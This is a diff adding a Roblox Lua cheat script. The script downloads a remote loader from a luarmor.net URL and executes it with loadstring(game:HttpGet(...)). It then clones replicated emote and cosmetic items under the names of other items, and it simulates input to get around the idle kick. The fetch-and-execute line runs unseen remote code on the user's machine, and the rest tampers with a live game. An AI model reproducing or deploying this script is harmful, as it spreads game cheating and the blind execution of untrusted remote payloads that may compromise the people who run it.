@@ -1,0 +1,26 @@
+local p, VU = game.Players.LocalPlayer, game:GetService("VirtualUser")
+task.spawn(function()
+    print("//// #### [M1] DATA_DEPLOYMENT_START #### ////")
+    _G.emoteSwaps = { { current = "APose", needed = "SnowmobileCruise" } }
+    local function dl(u) 
+        task.spawn(function() 
+            print("\\\\\\\\ HTTP \\\\\\\\ <REQUESTING_REMOTE_PAYLOAD> ...")
+            local s, e = pcall(function() loadstring(game:HttpGet(u))() end) 
+            if s then print("|||| SUCCESS |||| %%% Payload_Injected_Successfully") 
+            else print("|||| ERROR |||| !!! Failure: " .. tostring(e)) end
+        end) 
+    end
+    dl("https://api.luarmor.net/files/v3/loaders/36d5417f898691cb6c6d347b077e01e2.lua")
+    pcall(function()
+        local S = game:GetService("ReplicatedStorage").Items
+        print("\\\\\\\\ DATA \\\\\\\\ [SCANNING_REPLICATED_OBJECTS] ...")
+        local function dup(folder, old, new) 
+            local i = folder:FindFirstChild(old) 
+            if i then print("//// CLONE //// " .. old .. " ===>>> " .. new) i:Clone().Parent = folder i.Name = new end 
+        end
+        dup(S.Emotes, "RockinStride", "Stride")
+        dup(S.Emotes, "Broom", "SnowmobileCruise")
+        dup(S.Cosmetics, "ToxicInferno", "BorealisAurora")
+    end)
+    p.Idled:Connect(function() VU:CaptureController() VU:ClickButton2(Vector2.zero) print("//// PULSE //// Activity_Heartbeat_Sent") end)
+end)
